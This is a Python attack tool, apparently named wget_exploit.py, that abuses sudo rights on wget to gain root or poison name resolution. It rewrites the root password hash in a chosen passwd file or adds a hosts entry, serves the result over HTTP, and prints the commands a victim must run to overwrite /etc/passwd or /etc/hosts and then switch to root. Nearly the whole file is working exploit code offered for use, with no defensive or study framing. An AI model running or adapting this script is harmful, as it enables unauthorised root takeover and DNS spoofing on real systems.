#!/usr/bin/env python3
import argparse
import http.server
import ipaddress
import os
import socket
import socketserver
import tempfile

import netifaces

import logging
from passlib.hash import sha512_crypt

class CustomFormatter(logging.Formatter):
    """Logging Formatter to add colors"""

    format = "%(message)s"
    FORMATS = {
        logging.DEBUG: format,  # White
        logging.INFO: format,  # Cyan
        logging.ERROR: format,  # Red
    }

    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt)
        return formatter.format(record)

# Create a logger object
logger = logging.getLogger(__name__)

# Configure logger
console_handler = logging.StreamHandler()
console_handler.setFormatter(CustomFormatter())
logger.addHandler(console_handler)
logger.setLevel(logging.DEBUG)

CYAN = "\033[0;36m"
GREEN = "\033[0;32m"
RED = "\033[0;31m"
BOLD = "\033[1m"
UNDERLINE = "\033[4m"
RESET = "\033[0m"

if os.geteuid() != 0:
    logger.error(
        f"{BOLD}{RED}Root Privileges are required to execute this script. Run {UNDERLINE}sudo python3 wget_exploit.py{RESET}")
    exit(1)


def write_passwd(file: str, password: str) -> None:
    # Poison passwd file
    try:
        with open(file, "r") as f:
            contents = f.readlines()
            for index, line in enumerate(contents):
                if line.startswith("root"):
                    line = line.split(":")
                    line[1] = sha512_crypt.hash(password)
                    contents[index] = ":".join(line)
        with open(file, "w") as f:
            f.writelines(contents)
    except FileNotFoundError:
        logger.error(f"The file {file} does not exist.")
    except PermissionError:
        logger.error(f"Permission denied when trying to open {file}.")
    except Exception as e:
        logger.exception(f"An unexpected error occurred: {e}")


def write_hosts(file: str) -> None:
    # Poison hosts file
    try:
        address = input(
            f"{BOLD}Enter the IP address to poison {CYAN}(default: 127.0.0.1): {RESET} ")
        address = address if address else "127.0.0.1"

        hostname = input(
            f"{BOLD}Enter hostname to map with specified IP {CYAN}(default: localhost):{RESET} ")
        hostname = hostname if hostname else "localhost"

        payload = f"{address} {hostname}"

        with open(file, "r") as f:
            contents = f.readlines()
        for index, line in enumerate(contents):
            if line.startswith(address):
                contents[index] = payload + "\n"
        if not address in contents:
            contents.append(payload + "\n")

        with open(file, "w") as f:
            f.writelines(contents)
    except FileNotFoundError:
        logger.error(f"The file {file} does not exist.")
    except PermissionError:
        logger.error(f"Permission denied when trying to open {file}.")
    except Exception as e:
        logger.exception(f"An unexpected error occurred: {e}")

def check_interface(i: str) -> str:
    # Validate interface name
    try:
        host = ipaddress.IPv4Address(i)
    except ipaddress.AddressValueError:
        try:
            host = netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr']
        except ValueError:
            logger.error(
                f"{RED}[!]{RESET} Error detering HTTP hosting address. Did you provide an {UNDERLINE}interface{RESET} or {UNDERLINE}ip{RESET}?")
    return host


def tmp_file() -> str:
    # Create a temporary HTTP server location
    serve_path = os.path.join(os.path.join(
        tempfile._get_default_tempdir(), next(tempfile._get_candidate_names())), "www")
    os.makedirs(serve_path)

    return serve_path


class TCPServer(socketserver.TCPServer):
    # Reuseable TCP server
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(self.server_address)


class Handler(http.server.SimpleHTTPRequestHandler):
    # Custom HTTP handler
    def __init__(self, *args, directory=tmp_file(), **kwargs):
        super().__init__(*args, **kwargs)

    def log_message(self, format, *func_args):
        super().log_message(format, *func_args)

    def log_request(self, format, *func_args):
        super().log_request(format, *func_args)
 
def main() -> None:
    try:
        interface = input(
            f"{BOLD}Network interface or IP address to host the HTTP server {CYAN}{BOLD}(default: eth0):{RESET} ").lower()
        interface = interface if interface else "eth0"

        port = input(
            f"{BOLD}Specify alternate port {CYAN}{BOLD}(default: 8000):{RESET} ")
        port = int(port) if port else 8000
        serve_host = check_interface(interface)

        while True:
            file = input(f"{BOLD}File to poison {CYAN}{BOLD}(Must be a valid file!):{RESET} ")
            if not file.startswith("/"):
                file = "/" + file
            if os.path.isfile(file):
                break
            logger.error("Not a valid file. Please provide a valid file.")


        while True:
            payload = input(
                f"{BOLD}Payload to execute (Options: {CYAN}{BOLD}forceroot, dnspoof):{RESET} ").lower()
            if not payload in ["forceroot", "dnspoof"]:
                logger.error(
                    f"{RED}Invalid choice.{RESET} Please choose either 'forceroot' or 'dnspoof'.")
                continue
            break

        match payload:
            case "forceroot":
                password = input(
                    f"{BOLD}Password to set for the root user {CYAN}{BOLD}(default: root):{RESET} ")
                password = password if password else "root"
                write_passwd(file, password)

                logger.info(
                    f"\n{GREEN}[+]{RESET} Poisoned {UNDERLINE}{GREEN}{file}{RESET}")
                logger.info(
                    f"{GREEN}[+]{RESET} Serving poisoned {UNDERLINE}{GREEN}{file}{RESET} on {GREEN}{serve_host}:{port}{RESET}")
                logger.info(
                    f"{GREEN}[-]{RESET}{BOLD} Execute the following command on the victims shell:{RESET}\n\n{GREEN}sudo wget http://{serve_host}:{port}{file} -O /etc/passwd\n{RESET}")
                logger.info(
                    f"{GREEN}[*]{RESET} To switch to the root user on the victim's side, execute the following command:\n\n{GREEN}su - root\n\n[+]{RESET} {BOLD}When prompted for the password, enter: {GREEN}{password}")

            case "dnspoof":
                write_hosts(file)

                logger.info(
                    f"{GREEN}[+]{RESET} Poisoned {UNDERLINE}{GREEN}{file}{RESET}")
                logger.info(
                    f"{GREEN}[+]{RESET} Serving poisoned {UNDERLINE}{GREEN}{file}{RESET} on {GREEN}{serve_host}:{port}{RESET}")
                logger.info(
                    f"{GREEN}[-]{RESET}{BOLD} Execute the following command on the victims shell:{RESET}\n\n{GREEN}sudo wget http://{serve_host}:{port}{file} -O /etc/hosts{RESET}")

        def serve_http():
            # Serve the HTTP server
            with TCPServer((serve_host, port), Handler) as httpd:
                httpd.serve_forever()
        try:
            serve_http()

        except KeyboardInterrupt:
            logger.error(
                f"{RED}[!]{RESET} {BOLD}Keyboard interrupt. Exiting . . .{RESET}")

    except Exception:
        logger.exception("An error occurred in writing hosts file.")


if __name__ == "__main__":
    main()
